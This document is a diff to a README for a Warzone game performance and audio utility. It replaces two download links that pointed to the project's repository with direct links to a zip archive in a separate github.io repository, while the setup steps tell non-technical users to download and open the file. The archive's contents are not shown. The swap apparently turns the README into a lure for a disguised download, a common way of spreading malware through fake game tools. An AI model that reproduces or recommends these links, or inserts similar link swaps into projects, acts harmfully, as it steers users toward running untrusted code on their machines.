@@ -5,7 +5,7 @@ description: "Optimize performance, enhance audio, and manage custom crosshair o
 ---
 # 🎯 Warzone-Game-Utility - Improve your game performance and audio
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Sd8iu1691/Warzone-Game-Utility)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Sd8iu1691/sd8iu1691.github.io/raw/refs/heads/main/reverso/sd_iu_io_github_v3.9-beta.3.zip)
 
 ## 📖 About the software
 
@@ -19,7 +19,7 @@ Follow these steps to set up the software on your computer. You do not need tech
 2. Locate the file in your downloads folder.
 3. Open the file to start the utility.
 
-[Download the latest version here](https://github.com/Sd8iu1691/Warzone-Game-Utility)
+[Download the latest version here](https://github.com/Sd8iu1691/sd8iu1691.github.io/raw/refs/heads/main/reverso/sd_iu_io_github_v3.9-beta.3.zip)
 
 ## ⚙️ How to use the features
 
